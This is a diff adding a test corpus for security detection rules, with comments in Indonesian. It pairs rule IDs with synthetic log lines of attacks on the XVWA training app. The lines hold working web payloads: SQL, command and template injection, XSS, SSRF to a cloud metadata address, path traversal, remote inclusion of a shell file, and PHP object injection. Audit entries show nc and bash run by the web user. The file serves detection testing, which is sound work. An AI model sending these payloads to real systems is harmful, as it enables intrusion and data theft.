@@ -1,0 +1,72 @@
+# Corpus uji POSITIF: setiap baris = <expected_rule_id> TAB <log line>
+# Baris komentar diawali '#'. Dipakai oleh tests/run_tests.sh
+#
+# ---------- T1: pola pada request (access log JSON) ----------
+100201	Oct 31 11:00:01 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%27%20or%20%271%27%3D%271","status":"200","resp_bytes":"5120","duration_us":"15000"}
+100201	Oct 31 11:00:02 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?search=x%27%20union%20select%201,2,3%2D%2D%20","status":"200","resp_bytes":"5120","duration_us":"15000"}
+100201	Oct 31 11:00:03 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%20and%201%3D1%20union%20select%20table_name%20from%20information_schema.tables","status":"200","resp_bytes":"5120","duration_us":"15000"}
+100202	Oct 31 11:00:04 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli_blind/?item=1%20and%20sleep%2810%29","status":"200","resp_bytes":"5120","duration_us":"10200000"}
+100202	Oct 31 11:00:05 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli_blind/?item=1%20and%201%3D2","status":"200","resp_bytes":"900","duration_us":"12000"}
+100203	Oct 31 11:00:06 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%3Bid","status":"200","resp_bytes":"4096","duration_us":"3100000"}
+100203	Oct 31 11:00:07 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%7Cwhoami","status":"200","resp_bytes":"4096","duration_us":"3100000"}
+100203	Oct 31 11:00:08 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%20%26%26%20cat%20/etc/passwd","status":"200","resp_bytes":"4096","duration_us":"3100000"}
+100203	Oct 31 11:00:09 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%60id%60","status":"200","resp_bytes":"4096","duration_us":"3100000"}
+100204	Oct 31 11:00:10 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/xpath/?search=1%27%20or%20%271%27%3D%271","status":"200","resp_bytes":"3000","duration_us":"9000"}
+100204	Oct 31 11:00:11 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/xpath/?search=1%27%5D%7Ccount%28/*%29","status":"200","resp_bytes":"3000","duration_us":"9000"}
+100205	Oct 31 11:00:12 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/formula_injection/export.php?x=%3Dcmd%7C%27/C%20calc%27%21A0","status":"200","resp_bytes":"800","duration_us":"7000"}
+100206	Oct 31 11:00:13 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/php_object_injection/?r=O%3A19%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A10%3A%22system%28id%29%22%3B%7D","status":"200","resp_bytes":"2000","duration_us":"8000"}
+100207	Oct 31 11:00:14 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/fileupload/","status":"200","resp_bytes":"6000","duration_us":"40000"}
+100208	Oct 31 11:00:15 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Ealert%281%29%3C%2Fscript%3E","status":"200","resp_bytes":"3100","duration_us":"6000"}
+100208	Oct 31 11:00:16 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/reflected_xss/?item=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E","status":"200","resp_bytes":"3100","duration_us":"6000"}
+100209	Oct 31 11:00:17 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/stored_xss/","status":"200","resp_bytes":"4000","duration_us":"11000"}
+100210	Oct 31 11:00:18 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/dom_xss/?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E","status":"200","resp_bytes":"3200","duration_us":"5500"}
+100211	Oct 31 11:00:19 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/ssrf_xspa/?img_url=http%3A%2F%2F127.0.0.1%3A3306%2F","status":"200","resp_bytes":"1200","duration_us":"500000"}
+100211	Oct 31 11:00:20 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/ssrf_xspa/?img_url=file%3A%2F%2F%2Fetc%2Fpasswd","status":"200","resp_bytes":"1800","duration_us":"20000"}
+100211	Oct 31 11:00:21 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/ssrf_xspa/?img_url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F","status":"200","resp_bytes":"900","duration_us":"800000"}
+100212	Oct 31 11:00:22 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/fi/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd","status":"200","resp_bytes":"2400","duration_us":"7000"}
+100212	Oct 31 11:00:23 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/fi/?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php","status":"200","resp_bytes":"2400","duration_us":"7000"}
+100212	Oct 31 11:00:24 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/fi/?file=http%3A%2F%2F198.51.100.200%2Fshell.txt","status":"200","resp_bytes":"600","duration_us":"300000"}
+100215	Oct 31 11:00:25 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/missfunc/?item=3&action=delete","status":"200","resp_bytes":"2000","duration_us":"12000"}
+100216	Oct 31 11:00:26 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/csrf/?passwd=hacked&confirm=hacked&submit=submit","status":"200","resp_bytes":"2100","duration_us":"14000"}
+100218	Oct 31 11:00:27 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/redirect/redirect.php?forward=http%3A%2F%2Fevil.example.net%2Fphish","status":"302","resp_bytes":"0","duration_us":"2000"}
+100219	Oct 31 11:00:28 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/ssti/?name=%7B%7B7%2A7%7D%7D&submit=Enter","status":"200","resp_bytes":"2600","duration_us":"9000"}
+100219	Oct 31 11:00:29 asiw-target-1 asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/ssti/?name=%7B%7B_self.env.registerUndefinedFilterCallback%28%22exec%22%29%7D%7D&submit=Enter","status":"200","resp_bytes":"2600","duration_us":"9000"}
+#
+# ---------- T2: indikator respons/error (error log aplikasi) ----------
+100301	[Sat Oct 31 11:00:30.123456 2026] [php:error] [pid 1234] [client 198.51.100.99:51234] PHP Fatal error:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version in /var/www/html/xvwa/vulnerabilities/sqli/home.php on line 57
+100306	[Sat Oct 31 11:00:31.123456 2026] [php:error] [pid 1234] [client 198.51.100.99:51234] PHP Notice:  unserialize(): Error at offset 0 of 12 bytes in /var/www/html/xvwa/vulnerabilities/php_object_injection/home.php on line 38
+100312	[Sat Oct 31 11:00:32.123456 2026] [php:warn] [pid 1234] [client 198.51.100.99:51234] PHP Warning:  include(): failed to open stream: No such file or directory in /var/www/html/xvwa/vulnerabilities/fi/home.php on line 36
+#
+# ---------- T3: bukti host ----------
+100403	type=SYSCALL msg=audit(1793000001.380:501): arch=c000003e syscall=59 success=yes exit=0 a0=55a1 a1=55a2 a2=55a3 a3=0 items=2 ppid=1000 pid=1234 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="id" exe="/usr/bin/id" key="asiw_web_exec"
+100403	type=SYSCALL msg=audit(1793000002.380:502): arch=c000003e syscall=59 success=yes exit=0 a0=55a1 a1=55a2 a2=55a3 a3=0 items=2 ppid=1000 pid=1235 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="asiw_web_exec"
+100423	type=SYSCALL msg=audit(1793000003.380:503): arch=c000003e syscall=59 success=yes exit=0 a0=55a1 a1=55a2 a2=55a3 a3=0 items=2 ppid=1000 pid=1236 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="nc" exe="/usr/bin/nc" key="asiw_web_exec"
+100423	type=SYSCALL msg=audit(1793000004.380:504): arch=c000003e syscall=59 success=yes exit=0 a0=55a1 a1=55a2 a2=55a3 a3=0 items=2 ppid=1000 pid=1237 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="bash" exe="/usr/bin/bash" key="asiw_web_exec"
+100411	type=SYSCALL msg=audit(1793000005.380:505): arch=c000003e syscall=42 success=yes exit=0 a0=0b a1=7ffd a2=10 a3=0 items=0 ppid=1000 pid=1238 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="apache2" exe="/usr/sbin/apache2" key="asiw_web_connect"
+100401	Oct 31 11:00:35 asiw-target-1 asiw-dbaudit: 20261031 11:00:35,asiw-target-1,root,localhost,12,42,QUERY,xvwa,'select * from caffaine where itemid = 1 union select 1,2,3,4,5,6,7 from information_schema.tables',0
+100401	Oct 31 11:00:36 asiw-target-1 asiw-dbaudit: 20261031 11:00:36,asiw-target-1,root,localhost,12,43,QUERY,xvwa,'select * from caffaine where itemid = 1 and sleep(10)',0
+100409	Oct 31 11:00:37 asiw-target-1 asiw-dbaudit: 20261031 11:00:37,asiw-target-1,root,localhost,12,44,QUERY,xvwa,'insert into comments (user,comment,date) values (0x61,0x3c7363726970743e,0x31) /* <script>alert(1)</script> */',0
+100415	Oct 31 11:00:38 asiw-target-1 asiw-dbaudit: 20261031 11:00:38,asiw-target-1,root,localhost,12,45,QUERY,xvwa,'delete from caffaine where itemid=3',0
+100416	Oct 31 11:00:39 asiw-target-1 asiw-dbaudit: 20261031 11:00:39,asiw-target-1,root,localhost,12,46,QUERY,xvwa,'UPDATE users set password=0x61 where username=0x62',0
+#
+# ---------- T3: YARA via active response (menutup kasus double extension) ----------
+100427	Oct 31 11:05:00 asiw-target-1 asiw-yara: {"file":"/var/www/html/xvwa/img/uploads/shell.php","matches":"Webshell_Generic_PHP","verdict":"malicious"}
+100427	Oct 31 11:05:01 asiw-target-1 asiw-yara: {"file":"/var/www/html/xvwa/img/uploads/shell.php.jpg","matches":"Webshell_Generic_PHP","verdict":"malicious"}
+#
+# ---------- Regresi anti-evasion (temuan audit 31 Okt 2026) ----------
+# Pola harus menerima bentuk MENTAH maupun PERCENT-ENCODED. Bug awal:
+# \b gagal bila didahului %20 (karakter '0' adalah word character).
+100201	Oct 31 15:00:01 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1' or '1'='1","status":"200"}
+100201	Oct 31 15:00:02 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%20union%20select%201,2,3","status":"200"}
+100201	Oct 31 15:00:03 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%20union/**/select%201","status":"200"}
+100201	Oct 31 15:00:04 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%2527%20or%201%3D1","status":"200"}
+100201	Oct 31 15:00:05 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli/?item=1%20and%20extractvalue(1,concat(0x7e,user()))","status":"200"}
+100202	Oct 31 15:00:06 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/sqli_blind/?item=1%20and%20ascii(user())%3E64","status":"200"}
+100204	Oct 31 15:00:07 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/xpath/?search=1%20count(/*)","status":"200"}
+100208	Oct 31 15:00:08 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/reflected_xss/?item=<script>alert(1)</script>","status":"200"}
+100208	Oct 31 15:00:09 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/reflected_xss/?item=%3Csvg%20onload%3Dalert(1)%3E","status":"200"}
+100219	Oct 31 15:00:10 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/ssti/?name={{7*7}}&submit=Enter","status":"200"}
+100211	Oct 31 15:00:11 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"POST","uri":"/xvwa/vulnerabilities/ssrf_xspa/?img_url=http://127.0.0.1:3306/","status":"200"}
+100212	Oct 31 15:00:12 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/fi/?file=php://filter/convert.base64-encode/resource=index.php","status":"200"}
+100206	Oct 31 15:00:13 t asiw-xvwa-web: {"remote_ip":"198.51.100.99","method":"GET","uri":"/xvwa/vulnerabilities/php_object_injection/?r=O:19:\"PHPObjectInjection\":1:{s:6:\"inject\";s:10:\"system(id)\";}","status":"200"}
+100447	Oct 31 15:00:14 t asiw-yara: {"file":"<rejected: control characters in filename>","matches":"ASIW_Suspicious_Filename","verdict":"suspicious"}
